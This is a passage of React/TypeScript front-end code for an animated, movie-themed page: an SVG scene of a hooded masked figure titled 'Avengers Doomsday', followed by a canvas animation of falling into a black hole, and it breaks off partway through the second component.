import { useEffect, useMemo, useRef, useState } from 'react'

function Doomsday({ onExit }: { onExit: () => void }) {
  const root = useRef<HTMLDivElement>(null)
  const { embers, rain } = useMemo(
    () => ({
      embers: Array.from({ length: 60 }).map(() => ({
        left: Math.random() * 100,
        size: 1.5 + Math.random() * 3.5,
        dur: 6 + Math.random() * 9,
        delay: -Math.random() * 12,
        drift: -100 + Math.random() * 200,
        c: Math.random() > 0.4 ? '#7dffa8' : '#ffb347',
      })),
      rain: Array.from({ length: 90 }).map(() => ({ left: Math.random() * 100, h: 40 + Math.random() * 70, dur: 0.5 + Math.random() * 0.5, delay: -Math.random() * 2, o: 0.1 + Math.random() * 0.25 })),
    }),
    [],
  )
  const onMove = (e: React.MouseEvent) => {
    const x = e.clientX / window.innerWidth - 0.5
    const y = e.clientY / window.innerHeight - 0.5
    root.current?.style.setProperty('--px', String(x))
    root.current?.style.setProperty('--py', String(y))
  }
  const par = (n: number) => ({ transform: `translate(calc(var(--px, 0) * ${n}px), calc(var(--py, 0) * ${n * 0.5}px))`, transition: 'transform .4s ease-out' })

  return (
    <div ref={root} onMouseMove={onMove} className="absolute inset-0 overflow-hidden bg-[#010504]" style={{ animation: 'irisOpen 2.2s cubic-bezier(.65,0,.2,1) both' }}>
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute inset-0" style={par(14)}>
          <img
            src="https://images.unsplash.com/photo-1670142379088-4487fc8038a8?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&q=80&w=1920"
            alt=""
            className="absolute inset-0 size-full object-cover"
            style={{ filter: 'grayscale(.55) contrast(1.2) brightness(.85) saturate(1.2)', animation: 'kenburns 40s ease-in-out infinite alternate' }}
          />
        </div>
        <div className="absolute inset-0 bg-[#0d7a40] mix-blend-color opacity-60" />
        <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-transparent to-black/80" />
      </div>
      <div className="pointer-events-none absolute left-1/2 top-[42%] size-[70vmax] -translate-x-1/2 -translate-y-1/2 rounded-full" style={{ background: 'radial-gradient(circle, rgba(125,255,168,.28), transparent 60%)', animation: 'blip 5s ease-in-out infinite' }} />

      <svg viewBox="330 150 940 750" className="pointer-events-none absolute bottom-0 left-1/2 h-[74%] w-auto -translate-x-1/2" style={{ maskImage: 'linear-gradient(to bottom, #000 70%, transparent 98%)', WebkitMaskImage: 'linear-gradient(to bottom, #000 70%, transparent 98%)', filter: 'drop-shadow(0 0 30px rgba(0,0,0,.8))' }}>
        <defs>
          <linearGradient id="dsky" x1="0" y1="0" x2="0" y2="1">
            <stop offset="0" stopColor="#000302" />
            <stop offset="0.5" stopColor="#06180f" />
            <stop offset="0.85" stopColor="#154d2c" />
            <stop offset="1" stopColor="#1e6a3b" />
          </linearGradient>
          <radialGradient id="dglow" cx="0.5" cy="0.5" r="0.5">
            <stop offset="0" stopColor="#7dffa8" stopOpacity="0.6" />
            <stop offset="0.5" stopColor="#2fbf6a" stopOpacity="0.2" />
            <stop offset="1" stopColor="#2fbf6a" stopOpacity="0" />
          </radialGradient>
          <linearGradient id="mask" x1="0.1" y1="0" x2="0.9" y2="1">
            <stop offset="0" stopColor="#e9edef" />
            <stop offset="0.35" stopColor="#9aa3a9" />
            <stop offset="0.7" stopColor="#50585e" />
            <stop offset="1" stopColor="#22282c" />
          </linearGradient>
          <linearGradient id="hood" x1="0" y1="0" x2="0" y2="1">
            <stop offset="0" stopColor="#1b7a42" />
            <stop offset="0.5" stopColor="#0b3a20" />
            <stop offset="1" stopColor="#020b06" />
          </linearGradient>
          <linearGradient id="fold" x1="0" y1="0" x2="1" y2="0">
            <stop offset="0" stopColor="#000" stopOpacity="0.55" />
            <stop offset="0.5" stopColor="#2fbf6a" stopOpacity="0.12" />
            <stop offset="1" stopColor="#000" stopOpacity="0.55" />
          </linearGradient>
          <linearGradient id="gold" x1="0" y1="0" x2="1" y2="0">
            <stop offset="0" stopColor="#6b5420" />
            <stop offset="0.5" stopColor="#f0d078" />
            <stop offset="1" stopColor="#6b5420" />
          </linearGradient>
          <filter id="blur8">
            <feGaussianBlur stdDeviation="8" />
          </filter>
          <filter id="blur3">
            <feGaussianBlur stdDeviation="3" />
          </filter>
          <filter id="clouds" x="0" y="0" width="100%" height="100%">
            <feTurbulence type="fractalNoise" baseFrequency="0.0045 0.011" numOctaves="5" seed="7" />
            <feColorMatrix values="0 0 0 0 0.35  0 0 0 0 0.9  0 0 0 0 0.55  0 0 0 1.6 -0.55" />
          </filter>
          <filter id="stone" x="0" y="0" width="100%" height="100%">
            <feTurbulence type="fractalNoise" baseFrequency="0.9" numOctaves="2" seed="3" />
            <feColorMatrix values="0 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 0 0.55 0" />
          </filter>
          <mask id="skymask">
            <rect width="1600" height="620" fill="#fff" />
          </mask>
        </defs>
        <g style={par(16)}>
          <g style={{ animation: 'doomFloat 8s ease-in-out infinite' }}>
            <ellipse cx="800" cy="860" rx="360" ry="22" fill="#000" opacity="0.6" filter="url(#blur8)" />
            <path d="M800 170 C 680 170 600 260 590 380 C 580 480 540 580 380 900 L1220 900 C 1060 580 1020 480 1010 380 C 1000 260 920 170 800 170 Z" fill="url(#hood)" />
            <path d="M590 380 C 580 480 540 580 380 900 L1220 900 C 1060 580 1020 480 1010 380" fill="none" stroke="#5dff9a" strokeOpacity="0.35" strokeWidth="2" filter="url(#blur3)" />
            <g fill="url(#fold)">
              <path d="M640 430 C 600 560 540 700 470 900 L 560 900 C 610 740 650 600 690 450 Z" />
              <path d="M740 520 C 720 640 700 780 690 900 L 780 900 C 780 780 790 640 800 540 Z" />
              <path d="M860 520 C 880 640 900 780 910 900 L 820 900 C 820 780 810 640 800 540 Z" />
              <path d="M960 430 C 1000 560 1060 700 1130 900 L 1040 900 C 990 740 950 600 910 450 Z" />
            </g>
            <path d="M800 215 C 722 215 680 290 680 380 C 680 460 730 540 800 575 C 870 540 920 460 920 380 C 920 290 878 215 800 215 Z" fill="#010605" />
            <path d="M800 245 C 738 245 706 302 706 378 C 706 444 744 506 800 534 C 856 506 894 444 894 378 C 894 302 862 245 800 245 Z" fill="url(#mask)" />
            <path d="M706 378 C 706 302 738 245 800 245" fill="none" stroke="#fff" strokeOpacity="0.55" strokeWidth="2" />
            <path d="M894 378 C 894 444 856 506 800 534" fill="none" stroke="#7dffa8" strokeOpacity="0.5" strokeWidth="2" filter="url(#blur3)" />
            <path d="M722 338 Q 760 322 790 344 L790 352 Q 760 338 722 350 Z M878 338 Q 840 322 810 344 L810 352 Q 840 338 878 350 Z" fill="#2c3338" />
            <path d="M728 356 L784 378 L784 392 L728 384 Z" fill="#010302" />
            <path d="M872 356 L816 378 L816 392 L872 384 Z" fill="#010302" />
            <path d="M734 364 L776 380 L734 376 Z M866 364 L824 380 L866 376 Z" fill="#a8ffc4" style={{ filter: 'drop-shadow(0 0 10px #7dffa8) drop-shadow(0 0 22px #3cff86)', animation: 'blip 3s ease-in-out infinite' }} />
            <path d="M800 392 L788 450 L812 450 Z" fill="#2a3035" opacity="0.85" />
            <path d="M786 452 L814 452" stroke="#1c2125" strokeWidth="2" />
            <path d="M770 486 L830 486 M778 498 L822 498 M786 510 L814 510" stroke="#242a2e" strokeWidth="2.5" strokeLinecap="round" />
            <path d="M716 410 Q 740 470 780 520 M884 410 Q 860 470 820 520" fill="none" stroke="#2a3035" strokeOpacity="0.5" strokeWidth="1.5" />
            {[722, 878].map((x) => (
              <g key={x}>
                <circle cx={x} cy={430} r="4" fill="#eef1f2" opacity="0.8" />
                <circle cx={x - 1} cy={429} r="1.5" fill="#fff" />
              </g>
            ))}
            <path d="M660 540 Q 800 600 940 540 L 990 620 Q 800 690 610 620 Z" fill="url(#gold)" />
            <path d="M660 540 Q 800 600 940 540" fill="none" stroke="#fff3c0" strokeOpacity="0.7" strokeWidth="2" />
            <circle cx="800" cy="618" r="14" fill="#0b3a20" stroke="#f0d078" strokeWidth="3" />
          </g>
        </g>

      </svg>

      <div className="pointer-events-none absolute inset-x-0 bottom-0 h-1/2 opacity-60" style={{ background: 'linear-gradient(to top, rgba(60,200,120,.28), transparent)', animation: 'fogDrift 18s ease-in-out infinite alternate' }} />
      <div className="pointer-events-none absolute -inset-x-40 bottom-[4%] h-40 rounded-full bg-[#9bffbb]/15 blur-3xl" style={{ animation: 'fogDrift 24s ease-in-out infinite alternate-reverse' }} />

      {rain.map((r, i) => (
        <span key={i} className="pointer-events-none absolute -top-20 block w-px bg-gradient-to-b from-transparent to-[#bfffd6]" style={{ left: `${r.left}%`, height: r.h, opacity: r.o, animation: `rainFall ${r.dur}s linear ${r.delay}s infinite` }} />
      ))}
      {embers.map((e, i) => (
        <span
          key={i}
          className="pointer-events-none absolute bottom-0 rounded-full"
          style={{ left: `${e.left}%`, width: e.size, height: e.size, background: e.c, boxShadow: `0 0 10px 2px ${e.c}`, '--drift': `${e.drift}px`, animation: `emberRise ${e.dur}s linear ${e.delay}s infinite` } as React.CSSProperties}
        />
      ))}

      <div className="pointer-events-none absolute inset-0 bg-[#9bffc0] mix-blend-screen" style={{ animation: 'flash 7s steps(1) infinite' }} />
      <div className="pointer-events-none absolute inset-0" style={{ background: 'radial-gradient(ellipse at center, transparent 40%, rgba(0,0,0,.85))' }} />
      <div
        className="pointer-events-none absolute inset-0 opacity-[0.16] mix-blend-overlay"
        style={{ backgroundImage: "url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.8' numOctaves='2'/%3E%3C/filter%3E%3Crect width='200' height='200' filter='url(%23n)'/%3E%3C/svg%3E\")", animation: 'grain 0.6s steps(3) infinite' }}
      />
      <div className="pointer-events-none absolute inset-x-0 top-0 h-[5vh] bg-black" />
      <div className="pointer-events-none absolute inset-x-0 bottom-0 h-[5vh] bg-black" />

      <div className="absolute inset-x-0 top-[9%] px-6 text-center" style={{ animation: 'fadeUp 1.8s ease-out 1.6s both' }}>
        <div className="font-mono text-[10px] uppercase tracking-[0.6em] text-[#9bffbb]/90">A new sphere</div>
        <h2 className="relative mt-3 font-display uppercase leading-[0.9] text-white" style={{ fontSize: 'clamp(2.6rem, 9vw, 6.5rem)', textShadow: '-2px 0 rgba(255,40,60,.55), 2px 0 rgba(60,255,160,.55), 0 0 40px rgba(109,255,154,.55)' }}>
          Avengers
          <span className="block bg-gradient-to-b from-[#eafff1] via-[#7dffa8] to-[#1f8a4c] bg-clip-text text-transparent" style={{ textShadow: 'none', filter: 'drop-shadow(0 0 22px rgba(109,255,154,.6))' }}>
            Doomsday
          </span>
        </h2>
        <div className="mx-auto mt-4 flex items-center justify-center gap-4">
          <span className="h-px w-14 bg-gradient-to-r from-transparent to-[#7dffa8]" />
          <p className="font-sans text-[11px] font-semibold uppercase tracking-[0.4em] text-white/75 sm:text-xs">All of reality. One ruler.</p>
          <span className="h-px w-14 bg-gradient-to-l from-transparent to-[#7dffa8]" />
        </div>
      </div>

      <div className="absolute inset-x-0 bottom-[8%] flex flex-col items-center gap-4 px-6" style={{ animation: 'fadeUp 1.4s ease-out 2.8s both' }}>
        <div className="font-display text-sm uppercase tracking-[0.4em] text-[#b6ffd0] drop-shadow-[0_0_12px_rgba(109,255,154,.7)]">Coming December 2026</div>
        <button
          onClick={onExit}
          className="-skew-x-12 bg-[#ec1d24] px-9 py-3 font-display text-sm uppercase tracking-[0.2em] text-white shadow-[5px_5px_0_#fff] transition-all hover:-translate-y-0.5 hover:shadow-[8px_8px_0_#fff] focus-visible:outline-2 focus-visible:outline-offset-4 focus-visible:outline-white"
        >
          <span className="inline-block skew-x-12">Return to Earth</span>
        </button>
      </div>
    </div>
  )
}

function Journey({ phase, onExit }: { phase: 'on' | 'out'; onExit: () => void }) {
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const lastStep = useRef(0)
  const meterRef = useRef<HTMLDivElement>(null)
  const depthRef = useRef<HTMLSpanElement>(null)
  const targetRef = useRef(0)
  const stageRef = useRef<'fall' | 'garden'>('fall')
  const phaseRef = useRef(phase)
  phaseRef.current = phase
  const [stage, setStage] = useState<'fall' | 'garden'>('fall')
  const [settled, setSettled] = useState(false)
  const [cap, setCap] = useState(0)

  const step = (dir: number) => {
    if (stageRef.current !== 'fall') return
    const n = performance.now()
    if (n - lastStep.current < 700) return
    lastStep.current = n
    targetRef.current = Math.min(1, Math.max(0, targetRef.current + dir * 0.36))
  }

  useEffect(() => {
    const canvas = canvasRef.current!
    const ctx = canvas.getContext('2d')!
    let w = 0
    let h = 0
    const resize = () => {
      const dpr = Math.min(window.devicePixelRatio || 1, 2)
      w = window.innerWidth
      h = window.innerHeight
      canvas.width = w * dpr
      canvas.height = h * dpr
      ctx.setTransform(dpr, 0, 0, dpr, 0, 0)
      ctx.fillStyle = '#000'
      ctx.fillRect(0, 0, w, h)
    }
    resize()
    window.addEventListener('resize', resize)

    const onWheel = (e: WheelEvent) => {
      if (Math.abs(e.deltaY) > 2) step(Math.sign(e.deltaY))
    }
    const onKey = (e: KeyboardEvent) => {
      if (['ArrowDown', 'PageDown', ' '].includes(e.key)) {
        e.preventDefault()
        step(1)
      } else if (['ArrowUp', 'PageUp'].includes(e.key)) step(-1)
    }
    let ty = 0
    const onTS = (e: TouchEvent) => (ty = e.touches[0].clientY)
    const onTM = (e: TouchEvent) => {
      const y = e.touches[0].clientY
      if (Math.abs(ty - y) > 24) {
        step(Math.sign(ty - y))
        ty = y
      }
    }
    window.addEventListener('wheel', onWheel, { passive: true })
    window.addEventListener('keydown', onKey)
    window.addEventListener('touchstart', onTS, { passive: true })
    window.addEventListener('touchmove', onTM, { passive: true })

    const maxR = () => Math.hypot(w, h) / 2
    let bg: HTMLCanvasElement | null = null
    let bgS = 0
    const buildBg = () => {
      bgS = Math.ceil(Math.hypot(w, h) * 1.15)
      bg = document.createElement('canvas')
      bg.width = bgS
      bg.height = bgS
      const b = bg.getContext('2d')!
      b.fillStyle = '#01020a'
      b.fillRect(0, 0, bgS, bgS)
      const blob = (x: number, y: number, r: number, c: string) => {
        const g = b.createRadialGradient(x, y, 0, x, y, r)
        g.addColorStop(0, c)
        g.addColorStop(1, 'rgba(0,0,0,0)')
        b.fillStyle = g
        b.fillRect(x - r, y - r, r * 2, r * 2)
      }
      const nebs = ['rgba(110,70,220,0.2)', 'rgba(40,110,210,0.17)', 'rgba(220,70,140,0.14)', 'rgba(30,170,180,0.1)']
      for (let i = 0; i < 18; i++) blob(Math.random() * bgS, Math.random() * bgS, bgS * (0.12 + Math.random() * 0.3), nebs[i % 4])
      for (let i = 0; i < 14; i++) blob(Math.random() * bgS, Math.random() * bgS, bgS * (0.05 + Math.random() * 0.12), 'rgba(0,0,6,0.55)')
      for (let i = 0; i < 5; i++) blob(Math.random() * bgS, Math.random() * bgS, bgS * (0.04 + Math.random() * 0.06), i % 2 ? 'rgba(255,120,190,0.22)' : 'rgba(110,200,255,0.2)')
      b.save()
      b.translate(bgS / 2, bgS / 2)
      b.rotate(-0.5)
      for (let i = 0; i < 16; i++)
        blob((Math.random() - 0.5) * bgS * 0.95, (Math.random() - 0.5) * bgS * 0.07, bgS * (0.1 + Math.random() * 0.12), i % 3 === 0 ? 'rgba(140,100,220,0.18)' : i % 3 === 1 ? 'rgba(70,120,210,0.14)' : 'rgba(230,140,100,0.09)')
      b.restore()
      b.save()
      b.translate(bgS / 2, bgS / 2)
      b.rotate(-0.5)
      const band = b.createLinearGradient(0, -bgS * 0.14, 0, bgS * 0.14)
      band.addColorStop(0, 'rgba(120,130,200,0)')
      band.addColorStop(0.5, 'rgba(210,190,220,0.2)')
      band.addColorStop(1, 'rgba(120,130,200,0)')
      b.fillStyle = band
      b.fillRect(-bgS * 0.7, -bgS * 0.14, bgS * 1.4, bgS * 0.28)
      for (let i = 0; i < 70; i++) blob((Math.random() - 0.5) * bgS * 1.1, (Math.random() - 0.5) * bgS * 0.05, bgS * (0.02 + Math.random() * 0.05), 'rgba(255,225,190,0.1)')
      for (let i = 0; i < 40; i++) blob((Math.random() - 0.5) * bgS, (Math.random() - 0.5) * bgS * 0.035, bgS * (0.015 + Math.random() * 0.04), 'rgba(4,3,10,0.6)')
      b.restore()
      const cols = ['255,255,255', '190,210,255', '255,232,196', '255,200,170']
      const star = (x: number, y: number, s: number, a: number) => {
        b.fillStyle = `rgba(${cols[Math.floor(Math.random() * 4)]},${a})`
        b.beginPath()
        b.arc(x, y, s, 0, Math.PI * 2)
        b.fill()
      }
      for (let i = 0; i < 2600; i++) star(Math.random() * bgS, Math.random() * bgS, 0.3 + Math.pow(Math.random(), 4) * 1.3, 0.3 + Math.random() * 0.7)
      for (let i = 0; i < 6000; i++) {
        const u = (Math.random() - 0.5) * bgS * 1.1
        const v = ((Math.random() + Math.random() + Math.random() - 1.5) / 1.5) * bgS * 0.06
        star(bgS / 2 + u * Math.cos(-0.5) - v * Math.sin(-0.5), bgS / 2 + u * Math.sin(-0.5) + v * Math.cos(-0.5), 0.3 + Math.random() * 0.6, 0.25 + Math.random() * 0.5)
      }
      for (let i = 0; i < 34; i++) {
        const x = Math.random() * bgS
        const y = Math.random() * bgS
        const r = 8 + Math.random() * 12
        blob(x, y, r, i % 3 === 0 ? 'rgba(255,215,170,0.6)' : i % 3 === 1 ? 'rgba(190,215,255,0.6)' : 'rgba(255,255,255,0.55)')
        if (i % 4 === 0) {
          b.strokeStyle = 'rgba(255,255,255,0.35)'
          b.lineWidth = 0.7
          b.beginPath()
          b.moveTo(x - r * 2.2, y)
          b.lineTo(x + r * 2.2, y)
          b.moveTo(x, y - r * 2.2)
          b.lineTo(x, y + r * 2.2)
          b.stroke()
        }
      }
    }

    const disk = Array.from({ length: 3600 }).map(() => ({
      rho: 1.25 + Math.pow(Math.random(), 1.7) * 4.6,
      a: Math.random() * Math.PI * 2,
      s: 0.6 + Math.random() * 1.5,
    }))
    const fg = Array.from({ length: 220 }).map(() => ({ ang: Math.random() * Math.PI * 2, z: Math.random(), tw: Math.random() * 6, hue: Math.random() }))
    const warp = Array.from({ length: 320 }).map(() => ({ ang: Math.random() * Math.PI * 2, z: Math.random() }))
    const galaxy = (() => {
      const S = 600
      const c = document.createElement('canvas')
      c.width = S
      c.height = S
      const g = c.getContext('2d')!
      const core = g.createRadialGradient(S / 2, S / 2, 0, S / 2, S / 2, S * 0.22)
      core.addColorStop(0, 'rgba(255,244,220,0.95)')
      core.addColorStop(0.3, 'rgba(255,200,140,0.5)')
      core.addColorStop(1, 'rgba(0,0,0,0)')
      g.fillStyle = core
      g.fillRect(0, 0, S, S)
      const arm = (t: number, i: number) => i * Math.PI + t * 5.2
      for (let i = 0; i < 60; i++) {
        const t = Math.random()
        const a = arm(t, i % 2)
        const x = S / 2 + Math.cos(a) * t * S * 0.44
        const y = S / 2 + Math.sin(a) * t * S * 0.44
        const gr = g.createRadialGradient(x, y, 0, x, y, 26)
        gr.addColorStop(0, i % 3 ? 'rgba(120,150,255,0.1)' : 'rgba(255,110,170,0.1)')
        gr.addColorStop(1, 'rgba(0,0,0,0)')
        g.fillStyle = gr
        g.fillRect(x - 26, y - 26, 52, 52)
      }
      for (let i = 0; i < 7000; i++) {
        const t = Math.pow(Math.random(), 0.7)
        const a = arm(t, i % 2) + (Math.random() - 0.5) * 0.6 * (1.1 - t * 0.4)
        const x = S / 2 + Math.cos(a) * t * S * 0.46 + (Math.random() - 0.5) * 8
        const y = S / 2 + Math.sin(a) * t * S * 0.46 + (Math.random() - 0.5) * 8
        g.fillStyle = t > 0.45 ? `rgba(165,195,255,${0.2 + Math.random() * 0.6})` : `rgba(255,222,175,${0.2 + Math.random() * 0.6})`
        g.fillRect(x, y, 1.2, 1.2)
      }
      return c
    })()
    const meteors: { x: number; y: number; vx: number; vy: number; life: number }[] = []

    const t0 = performance.now()
    let outAt = 0
    let enteredAt = 0
    let last = t0
    let raf = 0
    let d = 0
    let lastCap = 0
    const clamp = (v: number, a = 0, b = 1) => Math.min(Math.max(v, a), b)
    const ease = (t: number) => 1 - Math.pow(1 - clamp(t), 3)

    const frame = (now: number) => {
      const dt = Math.min((now - last) / 1000, 0.05)
      last = now
      if (enteredAt && now - enteredAt > 2400) {
        setSettled(true)
        return
      }
      if (phaseRef.current === 'out' && !outAt) outAt = now
      const grow = ease((now - t0) / 1600)
      const shrink = outAt ? 1 - ease((now - outAt) / 1200) : 1
      const k = grow * shrink

      d += (targetRef.current - d) * (1 - Math.exp(-dt * 1.6))
      if (d > 0.992 && stageRef.current === 'fall') {
        stageRef.current = 'garden'
        enteredAt = now
        setStage('garden')
      }

      const cx = w / 2
      const cy = h / 2
      const R = Math.min(w, h) * 0.1 * k * (0.4 + 2.8 * Math.pow(d, 1.4))
      const t = (now - t0) / 1000

      if (!bg || Math.abs(bgS - Math.hypot(w, h) * 1.15) > 2) buildBg()
      ctx.globalCompositeOperation = 'source-over'
      ctx.fillStyle = '#000'
      ctx.fillRect(0, 0, w, h)
      ctx.save()
      ctx.translate(cx, cy)
      ctx.rotate(t * 0.006 + d * 0.6)
      const zoom = (0.9 + grow * 0.1) * (1 + d * 1.2)
      ctx.scale(zoom, zoom)
      ctx.globalAlpha = 0.55 + 0.45 * grow
      ctx.drawImage(bg!, -bgS / 2, -bgS / 2)
      ctx.restore()
      ctx.globalAlpha = 1

      // distant galaxy
      const gA = 1 - clamp((d - 0.12) / 0.4)
      if (gA > 0.01) {
        ctx.save()
        ctx.globalCompositeOperation = 'lighter'
        ctx.translate(w * 0.74, h * 0.27 + d * h * 0.1)
        ctx.rotate(0.45 + t * 0.01)
        ctx.scale(1, 0.5)
        const gs = (Math.min(w, h) * (0.55 + d * 1.2)) / 600
        ctx.scale(gs, gs)
        ctx.globalAlpha = gA * 0.9 * grow
        ctx.drawImage(galaxy, -300, -300)
        ctx.restore()
      }

      // shooting stars
      ctx.globalCompositeOperation = 'lighter'
      if (Math.random() < dt * 0.6 && meteors.length < 3)
        meteors.push({ x: Math.random() * w * 1.2, y: Math.random() * h * 0.4, vx: -(500 + Math.random() * 500), vy: 250 + Math.random() * 250, life: 1 })
      for (let i = meteors.length - 1; i >= 0; i--) {
        const m = meteors[i]
        m.x += m.vx * dt
        m.y += m.vy * dt
        m.life -= dt * 1.1
        if (m.life <= 0) {
          meteors.splice(i, 1)
          continue
        }
        const gr = ctx.createLinearGradient(m.x, m.y, m.x - m.vx * 0.12, m.y - m.vy * 0.12)
        gr.addColorStop(0, `rgba(255,255,255,${m.life})`)
        gr.addColorStop(1, 'rgba(255,255,255,0)')
        ctx.strokeStyle = gr
        ctx.lineWidth = 1.6
        ctx.beginPath()
        ctx.moveTo(m.x, m.y)
        ctx.lineTo(m.x - m.vx * 0.12, m.y - m.vy * 0.12)
        ctx.stroke()
      }

      canvas.style.transform = `translate(${(Math.random() - 0.5) * Math.pow(d, 3) * 6}px, ${(Math.random() - 0.5) * Math.pow(d, 3) * 6}px) scale(1.02)`

      ctx.globalCompositeOperation = 'lighter'
      const far = maxR()
      for (const p of fg) {
        p.z += dt * (0.015 + d * 0.12)
        if (p.z > 1) p.z = 0.02
        const rad = R * 1.4 + far * p.z * p.z
        const sz = 0.4 + p.z * p.z * 2.4
        const tw = 0.6 + 0.4 * Math.sin(t * 2 + p.tw)
        ctx.fillStyle = p.hue > 0.7 ? `rgba(255,225,190,${p.z * tw * k})` : `rgba(205,222,255,${p.z * tw * k})`
        ctx.beginPath()
        ctx.arc(cx + Math.cos(p.ang) * rad, cy + Math.sin(p.ang) * rad, sz, 0, Math.PI * 2)
        ctx.fill()
      }
      ctx.lineCap = 'round'
      for (const p of warp) {
        p.z += dt * (0.04 + d * 0.5)
        if (p.z > 1) p.z = 0
        const rad = R * 1.3 + (far - R) * p.z * p.z * p.z
        const len = rad * (0.02 + d * 0.3 * p.z)
        const c = Math.cos(p.ang)
        const s = Math.sin(p.ang)
        ctx.strokeStyle = `rgba(200,220,255,${(0.06 + d * 0.7) * p.z * k})`
        ctx.lineWidth = 0.5 + p.z * 1.4
        ctx.beginPath()
        ctx.moveTo(cx + c * rad, cy + s * rad)
        ctx.lineTo(cx + c * (rad + len), cy + s * (rad + len))
        ctx.stroke()
      }

      // halo
      const halo = ctx.createRadialGradient(cx, cy, R * 0.9, cx, cy, R * 4.5 + 1)
      halo.addColorStop(0, 'rgba(255,170,80,0.28)')
      halo.addColorStop(0.35, 'rgba(255,110,40,0.1)')
      halo.addColorStop(1, 'rgba(0,0,0,0)')
      ctx.fillStyle = halo
      ctx.beginPath()
      ctx.arc(cx, cy, R * 4.5 + 1, 0, Math.PI * 2)
      ctx.fill()

      const tilt = -0.1
      const ct = Math.cos(tilt)
      const st = Math.sin(tilt)
      const squash = 0.2 + d * 0.12
      const spinBoost = 0.7 + d * 1.6
      const drawDisk = (front: boolean) => {
        for (const p of disk) {
          const sinA = Math.sin(p.a)
          if (front !== sinA >= 0) continue
          const cosA = Math.cos(p.a)
          const rr = p.rho * R
          const ex = cosA * rr
          const ey = sinA * rr * squash
          const x = cx + ex * ct - ey * st
          const y = cy + ex * st + ey * ct
          const dop = 0.25 + 0.75 * (0.5 - 0.5 * cosA)
          const heat = clamp((p.rho - 1.25) / 4.6)
          const rC = 255
          const gC = Math.round(240 - heat * 150)
          const bC = Math.round(210 - heat * 170)
          const al = dop * (0.25 + 0.75 * (1 - heat)) * k
          ctx.fillStyle = `rgba(${rC},${gC},${bC},${al})`
          const sz = p.s * (0.7 + (1 - heat) * 0.8)
          ctx.fillRect(x, y, sz, sz)
          if (!front) {
            const rl = R * (1.05 + (p.rho - 1.25) * 0.26)
            ctx.fillStyle = `rgba(${rC},${gC},${bC},${al * 0.9})`
            ctx.fillRect(cx + cosA * rl, cy + sinA * rl, sz, sz)
            ctx.fillStyle = `rgba(${rC},${gC},${bC},${al * 0.35})`
            ctx.fillRect(cx + cosA * rl * 0.98, cy - sinA * rl * 0.92, sz, sz)
          }
        }
      }
      for (const p of disk) {
        p.a += (1.5 / Math.pow(p.rho, 1.5)) * dt * spinBoost
        p.rho -= dt * (0.03 + 0.08 / p.rho)
        if (p.rho < 1.12) {
          p.rho = 5 + Math.random() * 0.9
        }
      }
      const diskGlow = (frontOnly: boolean) => {
        ctx.save()
        ctx.translate(cx, cy)
        ctx.rotate(tilt)
        ctx.scale(1, squash)
        if (frontOnly) {
          ctx.beginPath()
          ctx.rect(-R * 7, 0, R * 14, R * 7)
          ctx.clip()
        }
        const g = ctx.createRadialGradient(0, 0, R * 1.05, 0, 0, R * 5.4)
        g.addColorStop(0, `rgba(255,248,230,${0.5 * k})`)
        g.addColorStop(0.18, `rgba(255,190,110,${0.34 * k})`)
        g.addColorStop(0.5, `rgba(235,100,50,${0.14 * k})`)
        g.addColorStop(1, 'rgba(120,30,20,0)')
        ctx.fillStyle = g
        ctx.beginPath()
        ctx.arc(0, 0, R * 5.4, 0, Math.PI * 2)
        ctx.fill()
        ctx.restore()
      }
      diskGlow(false)
      const lens = ctx.createRadialGradient(cx, cy, R, cx, cy, R * 1.9)
      lens.addColorStop(0, `rgba(255,236,200,${0.34 * k})`)
      lens.addColorStop(0.4, `rgba(255,160,80,${0.12 * k})`)
      lens.addColorStop(1, 'rgba(0,0,0,0)')
      ctx.fillStyle = lens
      ctx.beginPath()
      ctx.arc(cx, cy, R * 1.9, 0, Math.PI * 2)
      ctx.fill()
      drawDisk(false)

      ctx.globalCompositeOperation = 'source-over'
      ctx.fillStyle = '#000'
      ctx.beginPath()
      ctx.arc(cx, cy, R, 0, Math.PI * 2)
      ctx.fill()

      ctx.globalCompositeOperation = 'lighter'
      diskGlow(true)
      drawDisk(true)

      ctx.save()
      ctx.shadowColor = '#ff9a3c'
      ctx.shadowBlur = 40 * k
      ctx.strokeStyle = `rgba(255,226,180,${0.85 * k})`
      ctx.lineWidth = Math.max(1, R * 0.015)
      ctx.beginPath()
      ctx.arc(cx, cy, R * 1.025, 0, Math.PI * 2)
      ctx.stroke()
      ctx.restore()
      ctx.strokeStyle = `rgba(255,170,90,${0.18 * k})`
      ctx.lineWidth = 1
      ctx.beginPath()
      ctx.arc(cx, cy, R * 1.3, 0, Math.PI * 2)
      ctx.stroke()
      const sw = w * (0.25 + d * 0.65) * k
      const sg2 = ctx.createLinearGradient(cx - sw, 0, cx + sw, 0)
      sg2.addColorStop(0, 'rgba(255,190,120,0)')
      sg2.addColorStop(0.5, `rgba(255,225,190,${0.5 * k})`)
      sg2.addColorStop(1, 'rgba(255,190,120,0)')
      ctx.fillStyle = sg2
      ctx.fillRect(cx - sw, cy - 0.8, sw * 2, 1.6)
      ctx.globalAlpha = 0.14
      ctx.fillRect(cx - sw, cy - 5, sw * 2, 10)
      ctx.globalAlpha = 1
      ctx.globalCompositeOperation = 'source-over'
      const vg = ctx.createRadialGradient(cx, cy, far * 0.35, cx, cy, far * 1.02)
      vg.addColorStop(0, 'rgba(0,0,0,0)')
      vg.addColorStop(1, `rgba(0,0,6,${0.7 * k})`)
      ctx.fillStyle = vg
      ctx.fillRect(0, 0, w, h)

      if (meterRef.current) meterRef.current.style.height = `${d * 100}%`
      if (depthRef.current) depthRef.current.textContent = Math.round((1 - d) * 26000).toLocaleString()
      const c = d < 0.15 ? 0 : d < 0.3 ? 1 : d < 0.5 ? 2 : d < 0.7 ? 3 : d < 0.88 ? 4 : 5
      if (c !== lastCap) {
        lastCap = c
        setCap(c)
      }

      raf = requestAnimationFrame(frame)
    }
    raf = requestAnimationFrame(frame)
    return () => {
      cancelAnimationFrame(raf)
      window.removeEventListener('resize', resize)
      window.removeEventListener('wheel', onWheel)
      window.removeEventListener('keydown', onKey)
      window.removeEventListener('touchstart', onTS)
      window.removeEventListener('touchmove', onTM)
    }
  }, [])

